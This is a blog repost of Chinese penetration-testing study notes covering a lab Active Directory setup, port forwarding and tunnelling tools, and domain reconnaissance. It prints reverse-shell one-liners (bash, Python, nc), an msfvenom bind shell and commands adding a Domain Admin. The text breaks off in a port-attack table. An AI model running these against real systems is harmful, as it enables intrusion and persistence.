
 <!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400">
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Inconsolata:400">
    <title>渗透测试学习与总结 | FlamePeak</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="FlamePeak">
    

    
    <meta name="description" content="本文来自：L3m0n， 在无意中看到这篇文章，就转了回来，在此对作者L3m0n的付出表示感谢，膜拜大神！如有问题请与原作者联系：iamstudy@126.com ###域环境搭建准备：DC: win2008DM: win2003DM: winxp  win2008(域控) 1、修改计算机名： 2、配置固定ip:其中网关设置错误，应该为192.168.206.2，开始默认的网管 3、服务器管理器—角">
<meta name="keywords" content="Pentest">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试学习与总结">
<meta property="og:url" content="http://flamepeak.com/2017/11/06/Pentest-study-20171106/index.html">
<meta property="og:site_name" content="FlamePeak">
<meta property="og:description" content="本文来自：L3m0n， 在无意中看到这篇文章，就转了回来，在此对作者L3m0n的付出表示感谢，膜拜大神！如有问题请与原作者联系：iamstudy@126.com ###域环境搭建准备：DC: win2008DM: win2003DM: winxp  win2008(域控) 1、修改计算机名： 2、配置固定ip:其中网关设置错误，应该为192.168.206.2，开始默认的网管 3、服务器管理器—角">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/1.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/2.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/3.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/4.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/5.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/6.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/7.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/8.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/9.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/7.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/2.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/3.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/4.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/5.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/6.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/8.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/9.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/10.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/3_proxy/1.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/10.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/1.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/2.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/6.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/5.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/3.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/4.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/7.png">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/4/8.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/3.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/4.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/5.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/6.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/1.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/2.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/7.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/8.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/9.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/10.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/11.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/12.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/13.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/14.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/15.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/16.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/17.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/5/18.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/1.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/2.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/3.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/4.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/5.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/6.jpg">
<meta property="og:image" content="http://flamepeak.com/sourcepictures/2017/11/06/6/7.jpg">
<meta property="og:updated_time" content="2017-11-06T12:33:50.623Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="渗透测试学习与总结">
<meta name="twitter:description" content="本文来自：L3m0n， 在无意中看到这篇文章，就转了回来，在此对作者L3m0n的付出表示感谢，膜拜大神！如有问题请与原作者联系：iamstudy@126.com ###域环境搭建准备：DC: win2008DM: win2003DM: winxp  win2008(域控) 1、修改计算机名： 2、配置固定ip:其中网关设置错误，应该为192.168.206.2，开始默认的网管 3、服务器管理器—角">
<meta name="twitter:image" content="http://flamepeak.com/sourcepictures/2017/11/06/1_domain/1.jpg">

    
    <link rel="alternative" href="/atom.xml" title="FlamePeak" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
  <meta name="google-site-verification" content="rYNq4pSdFJQ3Ir4VuV4A6TqVEEUP8o-rrwmST28FhQY">
  <meta name="baidu-site-verification" content="AL6EYSh1WZ">
</head>
</html>
  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="FlamePeak">FlamePeak</a></h1>
				<h2 class="blog-motto">We know something, but we do not know more.</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/notes">Notes</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
						<input type="hidden" name="q" value="site:flamepeak.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>

    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2017/11/06/Pentest-study-20171106/" title="渗透测试学习与总结" itemprop="url">渗透测试学习与总结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="FlamePeak" target="_blank" itemprop="author">FlamePeak</a>
		
  <p class="article-time">
    <time datetime="2017-11-06T11:59:49.000Z" itemprop="datePublished"> Published 2017-11-06</time>
    
  </p>
</header>
	<div class="article-content">
		
		<p>本文来自：L3m0n， 在无意中看到这篇文章，就转了回来，在此对作者L3m0n的付出表示感谢，膜拜大神！如有问题请与原作者联系：<a href="mailto:iamstudy@126.com" target="_blank" rel="noopener">iamstudy@126.com</a></p>
<p>###域环境搭建<br>准备：<br>DC: win2008<br>DM: win2003<br>DM: winxp</p>
<hr>
<p>win2008(域控)</p>
<p>1、修改计算机名：<br><img src="/sourcepictures/2017/11/06/1_domain/1.jpg" alt></p>
<p>2、配置固定ip:<br>其中网关设置错误，应该为192.168.206.2，开始默认的网管<br><img src="/sourcepictures/2017/11/06/1_domain/2.jpg" alt></p>
<p>3、服务器管理器—角色：<br><img src="/sourcepictures/2017/11/06/1_domain/3.jpg" alt></p>
<p>4、配置域服务:<br>dos下面输入<code>dcpromo</code><br><img src="/sourcepictures/2017/11/06/1_domain/4.jpg" alt></p>
<p>Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码</p>
<p>5、设置林根域：<br>林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生<br>具体见：<a href="http://angerfire.blog.51cto.com/198455/144123/" target="_blank" rel="noopener">http://angerfire.blog.51cto.com/198455/144123/</a><br><img src="/sourcepictures/2017/11/06/1_domain/5.jpg" alt></p>
<p>6、<strong>域数据存放的地址</strong><br><img src="/sourcepictures/2017/11/06/1_domain/6.jpg" alt></p>
<hr>
<p>win2003、winxp和08配置差不多</p>
<p>注意点是：<br>1、配置网络<br>dns server应该为主域控ip地址<br><img src="/sourcepictures/2017/11/06/1_domain/7.jpg" alt></p>
<p>2、加入域控<br><img src="/sourcepictures/2017/11/06/1_domain/8.jpg" alt></p>
<hr>
<p>域已经搭建完成，主域控会生成一个<code>krbtgt</code>账号<br>他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证<br><img src="/sourcepictures/2017/11/06/1_domain/9.jpg" alt></p>
<p>参考：<br>AD域环境的搭建 基于Server 2008 R2<br><a href="http://www.it165.net/os/html/201306/5493.html" target="_blank" rel="noopener">http://www.it165.net/os/html/201306/5493.html</a><br>Acitve Directory 域环境的搭建<br><a href="http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html</a></p>
<p>###端口转发&amp;&amp;边界代理<br>此类工具很多，测试一两个经典的。</p>
<p>####端口转发<br>1、windows<br>lcx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:lcx.exe -listen 1234 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">远程:lcx.exe -slave ip 1234 127.0.0.1 3389</span><br></pre></td></tr></table></figure>

<p>netsh<br>只支持tcp协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加转发规则</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389</span><br><span class="line">此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=9090</span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">xp需要安装ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/3_proxy/7.jpg" alt></p>
<p>更加详细参考：<a href="http://aofengblog.blog.163.com/blog/static/631702120148573851740/" target="_blank" rel="noopener">http://aofengblog.blog.163.com/blog/static/631702120148573851740/</a></p>
<p>2、linux<br>portmap<br><img src="/sourcepictures/2017/11/06/3_proxy/2.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:./portmap -m 2 -p1 1234 -p2 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">./portmap -m 1 -p1 3389 -h2 ip -p2 1234</span><br></pre></td></tr></table></figure>

<p>iptables  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、编辑配置文件/etc/sysctl.conf的net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">2、关闭服务</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">3、配置规则</span><br><span class="line">需要访问的内网地址：192.168.206.101</span><br><span class="line">内网边界web服务器：192.168.206.129</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</span><br><span class="line"></span><br><span class="line">4、保存&amp;&amp;重启服务</span><br><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>

<p>#####socket代理<br>xsocks<br>1、windows<br><img src="/sourcepictures/2017/11/06/3_proxy/3.jpg" alt></p>
<p>进行代理后，在windows下推荐使用Proxifier进行socket连接，规则自己定义<br><img src="/sourcepictures/2017/11/06/3_proxy/4.jpg" alt></p>
<p>2、linux<br>进行代理后，推荐使用proxychains进行socket连接<br>kali下的配置文件：<br><code>/etc/proxychains.conf</code><br>添加一条：<code>socks5     127.0.0.1 8888</code></p>
<p>然后在命令前加proxychains就进行了代理<br><img src="/sourcepictures/2017/11/06/3_proxy/5.jpg" alt></p>
<p><strong>神器推荐</strong><br><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a><br>跨平台+端口转发+socket代理结合体！darksn0w师傅的推荐。<br>ew_port_socket.zip</p>
<p>####基于http的转发与socket代理(低权限下的渗透)<br>如果目标是在dmz里面，数据除了web其他出不来，便可以利用http进行</p>
<p>1、端口转发<br>tunna</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;端口转发(将远程3389转发到本地1234)</span><br><span class="line">&gt;python proxy.py -u http://lemon.com/conn.jsp -l 1234 -r 3389 -v</span><br><span class="line">&gt;</span><br><span class="line">&gt;连接不能中断服务(比如ssh)</span><br><span class="line">&gt;python proxy.py -u http://lemon.com/conn.jsp -l 1234 -r 22 -v -s</span><br><span class="line">&gt;</span><br><span class="line">&gt;转发192.168.0.2的3389到本地</span><br><span class="line">&gt;python proxy.py -u http://lemon.com/conn.jsp -l 1234 -a 192.168.0.2 -r 3389</span><br></pre></td></tr></table></figure>

<p>具体参考：<a href="http://drops.wooyun.org/tools/650" target="_blank" rel="noopener">http://drops.wooyun.org/tools/650</a></p>
<p>2、socks代理<br>reGeorg  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://192.168.206.101/tunnel.php -p 8081</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/3_proxy/6.jpg" alt></p>
<p>####ssh通道<br><a href="http://staff.washington.edu/corey/fw/ssh-port-forwarding.html" target="_blank" rel="noopener">http://staff.washington.edu/corey/fw/ssh-port-forwarding.html</a></p>
<p>1、端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地访问127.0.0.1:port1就是host:port2(用的更多)</span><br><span class="line">ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发</span><br><span class="line"></span><br><span class="line">访问host:port2就是访问127.0.0.1:port1</span><br><span class="line">ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发</span><br><span class="line"></span><br><span class="line">可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</span><br><span class="line">ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port</span><br><span class="line"></span><br><span class="line">可以将dmz_host的hostport端口转发到remote_ip的port端口</span><br><span class="line">ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类</span><br></pre></td></tr></table></figure>

<p>2、socks</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socket代理:</span><br><span class="line">ssh -qTfnN -D port remotehost</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/3_proxy/8.jpg" alt></p>
<p>参考redrain大牛的文章：<a href="http://drops.wooyun.org/tips/5234" target="_blank" rel="noopener">http://drops.wooyun.org/tips/5234</a></p>
<p>###获取shell<br>####常规shell反弹<br>几个常用：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span> &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p>各种语言一句话反弹shell：<br><a href="http://wiki.wooyun.org/pentest:%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9shell" target="_blank" rel="noopener">http://wiki.wooyun.org/pentest:%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9shell</a></p>
<p>####突破防火墙的imcp_shell反弹</p>
<p>有时候防火墙可能对tcp进行来处理，然而对imcp并没有做限制的时候，就可以来一波~<br>kali运行(其中的ip地址填写为目标地址win03)：<br><img src="/sourcepictures/2017/11/06/3_proxy/9.jpg" alt></p>
<p>win03运行：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t kali_ip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>

<p>可以看到icmp进行通信的<br><img src="/sourcepictures/2017/11/06/3_proxy/10.jpg" alt></p>
<p>####Shell反弹不出的时候<br>主要针对：本机kali不是外网或者目标在dmz里面反弹不出shell，可以通过这种直连shell然后再通过http的端口转发到本地的metasploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、msfvenom -p windows/x64/shell/bind_tcp LPORT=12345 -f exe -o ./shell.exe</span><br><span class="line">先生成一个bind_shell</span><br><span class="line"></span><br><span class="line">2、本地利用tunna工具进行端口转发</span><br><span class="line">python proxy.py -u http://lemon.com/conn.jsp  -l 1111 -r 12345 v</span><br><span class="line"></span><br><span class="line">3、</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/shell/bind_tcp</span><br><span class="line">set LPORT 1111</span><br><span class="line">set RHOST 127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/3_proxy/1.jpg" alt></p>
<p>参考的文章：<br><a href="https://www.91ri.org/11722.html" target="_blank" rel="noopener">https://www.91ri.org/11722.html</a></p>
<p>####正向shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、nc -e /bin/sh -lp 1234</span><br><span class="line"></span><br><span class="line">2、nc.exe -e cmd.exe -lp 1234</span><br></pre></td></tr></table></figure>

<p>###信息收集(结构分析)<br>####基本命令<br>1、获取当前组的计算机名(一般remark有Dc可能是域控)：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Desktop&gt;net view</span><br><span class="line">Server Name            Remark</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">\\DC1</span><br><span class="line">\\DM-WINXP</span><br><span class="line">\\DM_WIN03</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>2、查看所有域  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Desktop&gt;net view /domain</span><br><span class="line">Domain</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">CENTOSO</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>3、从计算机名获取ipv4地址  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Desktop&gt;ping -n 1 DC1 -4</span><br><span class="line"></span><br><span class="line">Pinging DC1.centoso.com [192.168.206.100] with 32 bytes of data:</span><br><span class="line"></span><br><span class="line">Reply from 192.168.206.100: bytes=32 time&lt;1ms TTL=128</span><br><span class="line"></span><br><span class="line">Ping statistics for 192.168.206.100:</span><br><span class="line">    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip times in milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure>

<p>Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@echo off</span></span><br><span class="line">setlocal ENABLEDELAYEDEXPANSION</span><br><span class="line"><span class="meta">@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (</span></span><br><span class="line"><span class="meta">@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (</span></span><br><span class="line"><span class="meta">@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k  %%j)</span></span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><img src="/sourcepictures/2017/11/06/1_domain/10.jpg" alt></p>
<hr>
<p>以下执行命令时候会发送到域控查询,如果渗透的机器不是域用户权限,则会报错  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The request will be processed at a domain controller for domain</span><br><span class="line">System error 1326 has occurred.</span><br><span class="line">Logon failure: unknown user name or bad password.</span><br></pre></td></tr></table></figure>

<p>4、查看域中的用户名  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsquery user</span><br><span class="line">或者：</span><br><span class="line">C:\Users\lemon\Desktop&gt;net user /domain</span><br><span class="line"></span><br><span class="line">User accounts for \\DC1</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    krbtgt</span><br><span class="line">lemon                    pentest</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>5、查询域组名称  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\lemon\Desktop&gt;net group /domain</span><br><span class="line"></span><br><span class="line">Group Accounts for \\DC1</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">*DnsUpdateProxy</span><br><span class="line">*Domain Admins</span><br><span class="line">*Domain Computers</span><br><span class="line">*Domain Controllers</span><br><span class="line">*Domain Guests</span><br><span class="line">*Domain Users</span><br><span class="line">*Enterprise Admins</span><br><span class="line">*Enterprise Read-only Domain Controllers</span><br><span class="line">*Group Policy Creator Owners</span><br><span class="line">*Read-only Domain Controllers</span><br><span class="line">*Schema Admins</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<p>6、查询域管理员  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\lemon\Desktop&gt;net group &quot;Domain Admins&quot; /domain</span><br><span class="line">Group name     Domain Admins</span><br><span class="line">Comment        Designated administrators of the domain</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>

<p>7、添加域管理员账号  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加普通域用户</span><br><span class="line">net user lemon iam@L3m0n /add /domain</span><br><span class="line">将普通域用户提升为域管理员</span><br><span class="line">net group &quot;Domain Admins&quot; lemon /add /domain</span><br></pre></td></tr></table></figure>

<p>8、查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Desktop&gt;net config Workstation</span><br><span class="line">Computer name                        \\DM_WIN03</span><br><span class="line">Full Computer name                   DM_win03.centoso.com</span><br><span class="line">User name                            Administrator</span><br><span class="line"></span><br><span class="line">Workstation active on</span><br><span class="line">        NetbiosSmb (000000000000)</span><br><span class="line">        NetBT_Tcpip_&#123;6B2553C1-C741-4EE3-AFBF-CE3BA1C9DDF7&#125; (000C2985F6E4)</span><br><span class="line"></span><br><span class="line">Software version                     Microsoft Windows Server 2003</span><br><span class="line"></span><br><span class="line">Workstation domain                   CENTOSO</span><br><span class="line">Workstation Domain DNS Name          centoso.com</span><br><span class="line">Logon domain                         DM_WIN03</span><br><span class="line"></span><br><span class="line">COM Open Timeout (sec)               0</span><br><span class="line">COM Send Count (byte)                16</span><br><span class="line">COM Send Timeout (msec)              250</span><br></pre></td></tr></table></figure>

<p>9、查看域控制器(多域控制器的时候,而且只能用在域控制器上)  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain controllers&quot;</span><br></pre></td></tr></table></figure>

<p>10、查询所有计算机名称  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsquery computer</span><br><span class="line">下面这条查询的时候,域控不会列出</span><br><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure>

<p>11、net命令  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;1、映射磁盘到本地</span><br><span class="line">net use z: \\dc01\sysvol</span><br><span class="line"></span><br><span class="line">&gt;2、查看共享</span><br><span class="line">net view \\192.168.0.1</span><br><span class="line"></span><br><span class="line">&gt;3、开启一个共享名为app$，在d:\config</span><br><span class="line">&gt;net share app$=d:\config</span><br></pre></td></tr></table></figure>

<p>12、跟踪路由  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tracert 8.8.8.8</span><br></pre></td></tr></table></figure>

<hr>
<p>####定位域控<br>1、查看域时间及域服务器的名字  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\lemon\Desktop&gt;net time /domain</span><br><span class="line">Current time at \\DC1.centoso.com is 3/21/2016 12:37:15 AM</span><br></pre></td></tr></table></figure>

<p>2、nslookup</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\Desktop&gt;Nslookup -type=SRV _ldap._tcp.</span><br><span class="line">*** Can&apos;t find server address for &apos;_ldap._tcp.&apos;:</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">*** Can&apos;t find server name for address 192.168.206.100: Timed out</span><br><span class="line">Server:  UnKnown</span><br><span class="line">Address:  192.168.206.100</span><br><span class="line"></span><br><span class="line">*** UnKnown can&apos;t find -type=SRV: Non-existent domain</span><br></pre></td></tr></table></figure>

<p>3、通过ipconfig配置查找dns地址  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure>

<p>4、查询域控  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure>

<hr>
<p>####端口收集<br>端口方面的攻防需要花费的时间太多，引用一篇非常赞的端口总结文章  </p>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>攻击技巧</th>
</tr>
</thead>
<tbody><tr>
<td>21/22/69</td>
<td>ftp/tftp：文件传输协议</td>
<td>爆破\嗅探\溢出\后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td>爆破OpenSSH；28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td>爆破\嗅探</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp</td>
<td>劫持\欺骗</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>爆破\未授权访问\远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>爆破</td>
</tr>
